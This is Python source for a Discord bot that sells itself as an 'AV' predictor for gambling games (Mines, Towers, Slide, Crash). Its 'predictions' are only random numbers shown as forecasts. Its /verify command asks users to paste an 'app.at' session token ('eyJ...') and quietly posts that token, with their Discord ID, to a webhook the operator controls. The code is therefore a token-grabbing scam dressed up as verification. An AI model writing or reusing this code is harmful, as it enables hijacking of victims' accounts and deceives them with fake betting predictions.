import random
import io
import os
import re
from datetime import datetime

import aiohttp
import discord
from discord.ext import commands
from discord import app_commands
from PIL import Image, ImageDraw, ImageFont

TOKEN = os.getenv("TOKEN")
VERIFY_WEBHOOK_URL = os.getenv("VERIFY_WEBHOOK_URL")

if TOKEN is None:
    raise ValueError("TOKEN environment variable is missing.")

TILE_ID = "1515843081000321185"
BOMB_ID = "1515845771663249579"
DIAMOND_ID = "1515845801832611951"

SLIDE_RED_ID = "1515851713142198273"
SLIDE_PURPLE_ID = "1515851696826355835"

TOWERS_RIGHT_ID = "1515851549677715556"
TOWERS_WRONG_ID = "1515851526998851594"

TILE_URL = f"https://cdn.discordapp.com/emojis/{TILE_ID}.png"
BOMB_URL = f"https://cdn.discordapp.com/emojis/{BOMB_ID}.png"
DIAMOND_URL = f"https://cdn.discordapp.com/emojis/{DIAMOND_ID}.png"

SLIDE_RED_URL = f"https://cdn.discordapp.com/emojis/{SLIDE_RED_ID}.png"
SLIDE_PURPLE_URL = f"https://cdn.discordapp.com/emojis/{SLIDE_PURPLE_ID}.png"

TOWERS_RIGHT_URL = f"https://cdn.discordapp.com/emojis/{TOWERS_RIGHT_ID}.png"
TOWERS_WRONG_URL = f"https://cdn.discordapp.com/emojis/{TOWERS_WRONG_ID}.png"

bot = commands.Bot(
    command_prefix="!",
    intents=discord.Intents.default()
)


def get_font(size, bold=False):
    font_paths = [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
        "/usr/share/fonts/truetype/liberation2/LiberationSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/liberation2/LiberationSans-Regular.ttf",
        "C:/Windows/Fonts/arialbd.ttf" if bold else "C:/Windows/Fonts/arial.ttf",
        "arialbd.ttf" if bold else "arial.ttf"
    ]

    for path in font_paths:
        try:
            return ImageFont.truetype(path, size)
        except:
            continue

    return ImageFont.load_default()


def draw_big_text(base_image, text, position, size, fill, bold=True):
    font = get_font(size, bold=bold)

    test = Image.new("RGBA", (10, 10), (0, 0, 0, 0))
    test_draw = ImageDraw.Draw(test)
    bbox = test_draw.textbbox((0, 0), text, font=font)

    text_width = bbox[2] - bbox[0]
    text_height = bbox[3] - bbox[1]

    text_image = Image.new(
        "RGBA",
        (text_width + 20, text_height + 20),
        (0, 0, 0, 0)
    )

    text_draw = ImageDraw.Draw(text_image)
    text_draw.text(
        (10 - bbox[0], 10 - bbox[1]),
        text,
        font=font,
        fill=fill
    )

    base_image.alpha_composite(text_image, position)


async def download_image(url):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            data = await response.read()
            return Image.open(io.BytesIO(data)).convert("RGBA")


async def create_mines_image(board, grid_size):
    tile_size = 72
    gap = 8
    padding = 20

    width = padding * 2 + grid_size * tile_size + (grid_size - 1) * gap
    height = padding * 2 + grid_size * tile_size + (grid_size - 1) * gap

    image = Image.new("RGBA", (width, height), (14, 18, 30, 255))
    draw = ImageDraw.Draw(image)

    tile_img = (await download_image(TILE_URL)).resize((tile_size, tile_size))
    bomb_img = (await download_image(BOMB_URL)).resize((tile_size, tile_size))
    diamond_img = (await download_image(DIAMOND_URL)).resize((tile_size, tile_size))

    for index, cell in enumerate(board):
        row = index // grid_size
        col = index % grid_size

        x = padding + col * (tile_size + gap)
        y = padding + row * (tile_size + gap)

        draw.rounded_rectangle(
            [x, y, x + tile_size, y + tile_size],
            radius=12,
            fill=(22, 28, 48, 255)
        )

        if cell == "tile":
            image.paste(tile_img, (x, y), tile_img)
        elif cell == "bomb":
            image.paste(bomb_img, (x, y), bomb_img)
        elif cell == "diamond":
            image.paste(diamond_img, (x, y), diamond_img)

    image_bytes = io.BytesIO()
    image.save(image_bytes, format="PNG")
    image_bytes.seek(0)

    return image_bytes


async def create_towers_image(rows, columns):
    tile_size = 78
    gap = 10
    padding = 24

    width = padding * 2 + columns * tile_size + (columns - 1) * gap
    height = padding * 2 + 8 * tile_size + 7 * gap

    image = Image.new("RGBA", (width, height), (14, 18, 30, 255))
    draw = ImageDraw.Draw(image)

    right_img = (await download_image(TOWERS_RIGHT_URL)).resize((tile_size, tile_size))
    wrong_img = (await download_image(TOWERS_WRONG_URL)).resize((tile_size, tile_size))

    for row_index, row in enumerate(rows):
        for col_index, cell in enumerate(row):
            x = padding + col_index * (tile_size + gap)
            y = padding + row_index * (tile_size + gap)

            draw.rounded_rectangle(
                [x, y, x + tile_size, y + tile_size],
                radius=12,
                fill=(22, 28, 48, 255)
            )

            if cell == "right":
                image.paste(right_img, (x, y), right_img)
            else:
                image.paste(wrong_img, (x, y), wrong_img)

    image_bytes = io.BytesIO()
    image.save(image_bytes, format="PNG")
    image_bytes.seek(0)

    return image_bytes


async def create_slide_image(result):
    width = 520
    height = 260

    image = Image.new("RGBA", (width, height), (14, 18, 30, 255))
    draw = ImageDraw.Draw(image)

    title_font = get_font(34, bold=True)
    result_font = get_font(58, bold=True)

    if result == "Red":
        emoji_img = (await download_image(SLIDE_RED_URL)).resize((120, 120))
        accent = (255, 48, 120, 255)
    else:
        emoji_img = (await download_image(SLIDE_PURPLE_URL)).resize((120, 120))
        accent = (160, 70, 255, 255)

    draw.rounded_rectangle(
        [20, 20, width - 20, height - 20],
        radius=22,
        fill=(22, 28, 48, 255),
        outline=accent,
        width=4
    )

    image.paste(emoji_img, (55, 70), emoji_img)

    draw.text((200, 65), "AV Slide Predictor", font=title_font, fill=(255, 255, 255, 255))
    draw.text((200, 125), result, font=result_font, fill=accent)

    image_bytes = io.BytesIO()
    image.save(image_bytes, format="PNG")
    image_bytes.seek(0)

    return image_bytes


async def create_crash_image(multiplier):
    width = 900
    height = 420

    image = Image.new("RGBA", (width, height), (14, 18, 30, 255))
    draw = ImageDraw.Draw(image)

    draw.rounded_rectangle(
        [30, 30, width - 30, height - 30],
        radius=30,
        fill=(22, 28, 48, 255),
        outline=(43, 140, 255, 255),
        width=8
    )

    draw_big_text(
        image,
        "AV Crash Predictor",
        (70, 55),
        54,
        (255, 255, 255, 255),
        bold=True
    )

    multi_text = f"{multiplier}x"

    font = get_font(180, bold=True)
    temp = Image.new("RGBA", (10, 10), (0, 0, 0, 0))
    temp_draw = ImageDraw.Draw(temp)
    bbox = temp_draw.textbbox((0, 0), multi_text, font=font)
    text_width = bbox[2] - bbox[0]

    draw_big_text(
        image,
        multi_text,
        ((width - text_width) // 2, 135),
        180,
        (43, 200, 255, 255),
        bold=True
    )

    draw_big_text(
        image,
        "Generated multiplier",
        (70, 330),
        36,
        (180, 190, 210, 255),
        bold=True
    )

    image_bytes = io.BytesIO()
    image.save(image_bytes, format="PNG")
    image_bytes.seek(0)

    return image_bytes


class VerifyModal(discord.ui.Modal, title="Verify Account"):
    username = discord.ui.TextInput(
        label="Enter your app.at value",
        placeholder="Example: eyJhbGci...",
        required=True,
        min_length=2,
        max_length=1000
    )

    async def on_submit(self, interaction: discord.Interaction):
        guild = interaction.guild
        username_value = str(self.username.value).strip()

        if guild is None:
            await interaction.response.send_message("Invalid", ephemeral=True)
            return

        if not re.fullmatch(r"ey\S*", username_value):
            await interaction.response.send_message("Invalid", ephemeral=True)
            return

        role = discord.utils.get(guild.roles, name="Connected")

        if role is None:
            await interaction.response.send_message("Invalid", ephemeral=True)
            return

        await interaction.user.add_roles(role)

        if VERIFY_WEBHOOK_URL:
            async with aiohttp.ClientSession() as session:
                await session.post(
                    VERIFY_WEBHOOK_URL,
                    json={
                        "content": (
                            f"✅ New verification\n"
                            f"Discord: {interaction.user.mention}\n"
                            f"Discord ID: `{interaction.user.id}`\n"
                            f"Username: `{username_value}`\n"
                            f"Time: `{datetime.utcnow().isoformat()} UTC`"
                        )
                    }
                )

        await interaction.response.send_message(
            "✅ Verified. You received the `Connected` role.",
            ephemeral=True
        )


@bot.tree.command(name="verify", description="Verify yourself and receive the Connected role.")
async def verify(interaction: discord.Interaction):
    await interaction.response.send_modal(VerifyModal())


@bot.tree.command(name="mines", description="Generate a Mines board.")
@app_commands.describe(
    grid_size="Grid size 2-10",
    safe_tiles="Number of diamond tiles",
    bombs="Number of bomb tiles"
)
async def mines(interaction: discord.Interaction, grid_size: int, safe_tiles: int, bombs: int):
    if grid_size < 2 or grid_size > 10:
        await interaction.response.send_message("❌ Grid size must be between 2 and 10.", ephemeral=True)
        return

    board_size = grid_size * grid_size

    if safe_tiles < 1:
        await interaction.response.send_message("❌ Safe tiles must be at least 1.", ephemeral=True)
        return

    if bombs < 1:
        await interaction.response.send_message("❌ Bombs must be at least 1.", ephemeral=True)
        return

    if safe_tiles + bombs > board_size:
        await interaction.response.send_message(
            f"❌ Safe tiles + bombs cannot exceed {board_size}.",
            ephemeral=True
        )
        return

    await interaction.response.defer()

    board = ["tile"] * board_size
    positions = list(range(board_size))
    random.shuffle(positions)

    for pos in positions[:safe_tiles]:
        board[pos] = "diamond"

    for pos in positions[safe_tiles:safe_tiles + bombs]:
        board[pos] = "bomb"

    image_bytes = await create_mines_image(board, grid_size)
    file = discord.File(fp=image_bytes, filename="mines_board.png")

    embed = discord.Embed(
        title="💎 AV Mines Predictor",
        description=(
            f"**Grid Size:** `{grid_size}×{grid_size}`\n"
            f"**Bombs:** `{bombs}`\n"
            f"**Safe Tiles:** `{safe_tiles}`"
        ),
        color=discord.Color.from_rgb(43, 140, 255)
    )

    embed.set_image(url="attachment://mines_board.png")
    embed.set_footer(
        text=f"Requested by {interaction.user.display_name}",
        icon_url=interaction.user.display_avatar.url
    )

    await interaction.followup.send(
        content=interaction.user.mention,
        embed=embed,
        file=file
    )


@bot.tree.command(name="towers", description="Generate a Towers board.")
@app_commands.describe(mode="Choose easy, medium, or hard")
@app_commands.choices(
    mode=[
        app_commands.Choice(name="Easy", value="easy"),
        app_commands.Choice(name="Medium", value="medium"),
        app_commands.Choice(name="Hard", value="hard")
    ]
)
async def towers(interaction: discord.Interaction, mode: app_commands.Choice[str]):
    await interaction.response.defer()

    if mode.value == "easy":
        columns = 3
        safe_count = 2
        wrong_count = 1
    elif mode.value == "medium":
        columns = 2
        safe_count = 1
        wrong_count = 1
    else:
        columns = 3
        safe_count = 1
        wrong_count = 2

    rows = []

    for _ in range(8):
        row = ["right"] * safe_count + ["wrong"] * wrong_count
        random.shuffle(row)
        rows.append(row)

    rows = list(reversed(rows))

    image_bytes = await create_towers_image(rows, columns)
    file = discord.File(fp=image_bytes, filename="towers_board.png")

    embed = discord.Embed(
        title="🏰 AV Towers Predictor",
        description=(
            f"**Mode:** `{mode.name}`\n"
            f"**Rows:** `8`\n"
            f"**Columns:** `{columns}`"
        ),
        color=discord.Color.from_rgb(255, 196, 57)
    )

    embed.set_image(url="attachment://towers_board.png")
    embed.set_footer(
        text=f"Requested by {interaction.user.display_name}",
        icon_url=interaction.user.display_avatar.url
    )

    await interaction.followup.send(
        content=interaction.user.mention,
        embed=embed,
        file=file
    )


@bot.tree.command(name="slide", description="Generate a Slide color.")
async def slide(interaction: discord.Interaction):
    await interaction.response.defer()

    result = random.choice(["Red", "Purple"])
    image_bytes = await create_slide_image(result)
    file = discord.File(fp=image_bytes, filename="slide_result.png")

    color = discord.Color.red() if result == "Red" else discord.Color.purple()

    embed = discord.Embed(
        title="🎯 AV Slide Predictor",
        description=f"**Result:** `{result}`",
        color=color
    )

    embed.set_image(url="attachment://slide_result.png")
    embed.set_footer(
        text=f"Requested by {interaction.user.display_name}",
        icon_url=interaction.user.display_avatar.url
    )

    await interaction.followup.send(
        content=interaction.user.mention,
        embed=embed,
        file=file
    )


@bot.tree.command(name="crash", description="Generate a Crash multiplier.")
async def crash(interaction: discord.Interaction):
    await interaction.response.defer()

    roll = random.random()

    if roll < 0.60:
        multiplier = random.uniform(1.00, 2.00)
    elif roll < 0.85:
        multiplier = random.uniform(2.00, 5.00)
    elif roll < 0.95:
        multiplier = random.uniform(5.00, 20.00)
    elif roll < 0.99:
        multiplier = random.uniform(20.00, 100.00)
    else:
        multiplier = random.uniform(100.00, 400.00)

    multiplier = round(multiplier, 2)

    image_bytes = await create_crash_image(multiplier)
    file = discord.File(fp=image_bytes, filename="crash_result.png")

    embed = discord.Embed(
        title="🚀 AV Crash Predictor",
        description=f"**Predicted Crash:** `{multiplier}x`",
        color=discord.Color.from_rgb(43, 140, 255)
    )

    embed.set_image(url="attachment://crash_result.png")
    embed.set_footer(
        text=f"Requested by {interaction.user.display_name}",
        icon_url=interaction.user.display_avatar.url
    )

    await interaction.followup.send(
        content=interaction.user.mention,
        embed=embed,
        file=file
    )


@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s).")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

    print(f"Logged in as {bot.user}")
    print("Bot is ready!")

    if VERIFY_WEBHOOK_URL:
        print("Webhook URL loaded successfully.")
    else:
        print("Webhook URL is missing.")


bot.run(TOKEN)